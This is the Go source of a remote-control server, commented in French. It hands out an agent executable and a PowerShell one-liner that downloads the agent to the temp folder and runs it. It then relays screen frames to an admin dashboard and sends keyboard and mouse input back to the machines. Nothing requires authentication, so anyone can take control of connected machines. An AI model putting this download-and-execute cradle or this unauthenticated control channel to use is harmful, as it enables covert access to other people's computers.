package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type AgentSession struct {
	ID        string          `json:"id"`
	Hostname  string          `json:"hostname"`
	OS        string          `json:"os"`
	Connected time.Time       `json:"connected"`
	Displays  []interface{}   `json:"displays"`
	Conn      *websocket.Conn `json:"-"`
	mu        sync.Mutex
}

var (
	agents   = make(map[string]*AgentSession)
	agentsMu sync.RWMutex

	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool {
			return true // Accepter toutes les origines pour le dashboard
		},
	}
)

func main() {
	port := flag.Int("port", 8080, "Port d'écoute du serveur")
	binDir := flag.String("bin-dir", "./bin", "Dossier contenant l'agent compilé")
	flag.Parse()

	_ = os.MkdirAll(*binDir, 0755)

	// 1. Route pour télécharger l'agent via cmd / powershell / curl / certutil
	http.HandleFunc("/dl/agent.exe", func(w http.ResponseWriter, r *http.Request) {
		agentPath := filepath.Join(*binDir, "agent.exe")
		if _, err := os.Stat(agentPath); os.IsNotExist(err) {
			http.Error(w, "Agent non encore compilé sur le serveur (agent.exe introuvable)", http.StatusNotFound)
			return
		}
		w.Header().Set("Content-Disposition", "attachment; filename=agent.exe")
		w.Header().Set("Content-Type", "application/octet-stream")
		http.ServeFile(w, r, agentPath)
	})

	// 1.bis Script PowerShell one-liner à télécharger ou exécuter
	http.HandleFunc("/dl/run.ps1", func(w http.ResponseWriter, r *http.Request) {
		host := r.Host
		proto := "https"
		if r.TLS == nil && r.Header.Get("X-Forwarded-Proto") != "https" && !strings.Contains(host, "karpeekrn-uwu.site") {
			proto = "http"
		}
		script := fmt.Sprintf(`$url = "%s://%s/dl/agent.exe"
$out = "$env:TEMP\agent.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $out)
Start-Process -FilePath $out -ArgumentList "-server %s" -NoNewWindow
`, proto, host, host)
		w.Header().Set("Content-Type", "text/plain")
		w.Write([]byte(script))
	})

	// 2. API pour lister les agents connectés
	http.HandleFunc("/api/agents", func(w http.ResponseWriter, r *http.Request) {
		agentsMu.RLock()
		defer agentsMu.RUnlock()

		list := make([]*AgentSession, 0, len(agents))
		for _, a := range agents {
			list = append(list, a)
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(list)
	})

	// 3. WebSocket pour l'Agent (flux vidéo + réception inputs)
	http.HandleFunc("/ws/agent", handleAgentWS)

	// 4. WebSocket pour le Dashboard Admin (réception flux vidéo + envoi inputs)
	http.HandleFunc("/ws/admin", handleAdminWS)

	// 5. Interface Web Dashboard
	http.Handle("/", http.FileServer(http.Dir("./web")))

	addr := fmt.Sprintf(":%d", *port)
	log.Printf("======================================================")
	log.Printf("  Serveur ak-ses en écoute sur http://0.0.0.0%s", addr)
	log.Printf("  Dashboard Admin : http://localhost:%d", *port)
	log.Printf("  Téléchargement Agent : http://localhost:%d/dl/agent.exe", *port)
	log.Printf("======================================================")

	if err := http.ListenAndServe(addr, nil); err != nil {
		log.Fatalf("[-] Erreur serveur: %v", err)
	}
}

// WebSocket Agent
func handleAgentWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[-] Upgrade error (agent): %v", err)
		return
	}
	defer conn.Close()

	agentID := r.URL.Query().Get("id")
	if agentID == "" {
		agentID = fmt.Sprintf("agent-%d", time.Now().Unix())
	}
	hostname := r.URL.Query().Get("hostname")
	osName := r.URL.Query().Get("os")

	session := &AgentSession{
		ID:        agentID,
		Hostname:  hostname,
		OS:        osName,
		Connected: time.Now(),
		Conn:      conn,
	}

	agentsMu.Lock()
	agents[agentID] = session
	agentsMu.Unlock()

	log.Printf("[+] Machine connectée: %s (%s, %s)", agentID, hostname, osName)

	defer func() {
		agentsMu.Lock()
		delete(agents, agentID)
		agentsMu.Unlock()
		log.Printf("[-] Machine déconnectée: %s", agentID)
	}()

	// L'agent envoie des frames binaires ou des messages texte (displays info)
	for {
		msgType, data, err := conn.ReadMessage()
		if err != nil {
			break
		}

		if msgType == websocket.BinaryMessage {
			// Diffuser l'image aux admins qui contrôlent cette machine
			broadcastFrame(agentID, data)
		} else if msgType == websocket.TextMessage {
			// Traitement d'informations de l'agent (ex: liste d'écrans)
			var msg map[string]interface{}
			if err := json.Unmarshal(data, &msg); err == nil {
				if msg["type"] == "displays" {
					if disps, ok := msg["displays"].([]interface{}); ok {
						agentsMu.Lock()
						if a, exists := agents[agentID]; exists {
							a.Displays = disps
						}
						agentsMu.Unlock()
						broadcastMessage(agentID, data)
					}
				}
			}
		}
	}
}

// Gestion des sessions Admin
type AdminViewer struct {
	agentID string
	conn    *websocket.Conn
}

var (
	viewers   = make(map[*websocket.Conn]*AdminViewer)
	viewersMu sync.RWMutex
)

func broadcastFrame(agentID string, frame []byte) {
	viewersMu.RLock()
	defer viewersMu.RUnlock()

	for conn, viewer := range viewers {
		if viewer.agentID == agentID {
			conn.WriteMessage(websocket.BinaryMessage, frame)
		}
	}
}

func broadcastMessage(agentID string, msg []byte) {
	viewersMu.RLock()
	defer viewersMu.RUnlock()

	for conn, viewer := range viewers {
		if viewer.agentID == agentID {
			conn.WriteMessage(websocket.TextMessage, msg)
		}
	}
}

func handleAdminWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[-] Upgrade error (admin): %v", err)
		return
	}
	defer conn.Close()

	agentID := r.URL.Query().Get("id")
	viewer := &AdminViewer{
		agentID: agentID,
		conn:    conn,
	}

	viewersMu.Lock()
	viewers[conn] = viewer
	viewersMu.Unlock()

	log.Printf("[+] Admin a ouvert le contrôle de l'agent: %s", agentID)

	defer func() {
		viewersMu.Lock()
		delete(viewers, conn)
		viewersMu.Unlock()
		log.Printf("[-] Admin a fermé le contrôle de l'agent: %s", agentID)
	}()

	// L'admin envoie des commandes (clavier/souris)
	for {
		msgType, message, err := conn.ReadMessage()
		if err != nil {
			break
		}

		if msgType == websocket.TextMessage {
			agentsMu.RLock()
			agent, exists := agents[agentID]
			agentsMu.RUnlock()

			if exists && agent.Conn != nil {
				agent.mu.Lock()
				agent.Conn.WriteMessage(websocket.TextMessage, message)
				agent.mu.Unlock()
			}
		}
	}
}
